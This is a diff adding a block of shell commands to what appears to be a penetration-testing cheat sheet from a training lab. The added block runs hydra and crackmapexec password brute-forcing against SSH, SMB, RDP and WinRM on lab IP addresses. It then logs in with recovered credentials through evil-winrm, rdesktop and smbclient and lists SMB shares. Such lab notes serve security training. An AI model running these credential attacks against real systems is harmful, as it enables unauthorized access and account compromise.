@@ -29,3 +29,27 @@
 | `ssh b.gates@SERVER_IP -p PORT` | SSH to Server |
 | `ftp 127.0.0.1` | FTP to Server |
 | `su - user` | Switch to User |
+
+```shell
+crackmapexec winrm 10.129.252.193 -u username.list -p password.list
+hydra -L username.list  -P password.list -u -f ssh://10.129.252.193:22 -t 4
+rdesktop -u john -p november 10.129.252.193
+evil-winrm -i 10.129.252.193 -u john -p november
+ssh dennis@10.129.252.193 
+hydra -L username.list  -P password.list -u -f smb://10.129.252.193 -t 4 
+hydra -L username.list  -P password.list -u -f rdp://10.129.252.193 -t 4 
+hydra -L username.list  -P password.list -u -f rdp://10.129.252.193
+hydra -L username.list  -P password.list -u -f rdp://10.129.252.193 -I
+hydra -L username.list  -P password.list -u -f smb://10.129.252.193
+crackmapexec smb 10.129.252.193 -u username.list -p password.list
+rdesktop -u chris -p 789456123 10.129.252.193
+crackmapexec smb 10.129.42.197 -u "john" -p "november" --shares
+smbclient -U john \\\\10.129.252.193\\
+crackmapexec smb 10.129.42.197 -u "john" -p "november" --shares
+crackmapexec smb 10.129.42.197 -u "john" -p "november"
+crackmapexec smb 10.129.42.197 -u "cassie" -p "12345678910" --shares
+crackmapexec smb 10.129.42.197 -u "chris" -p "789456123" --shares
+crackmapexec smb 10.129.252.193 -u "cassie" -p "12345678910" --shares
+smbclient -U user \\\\10.129.252.193\\CASSIE
+smbclient -U cassie \\\\10.129.252.193\\CASSIE
+```
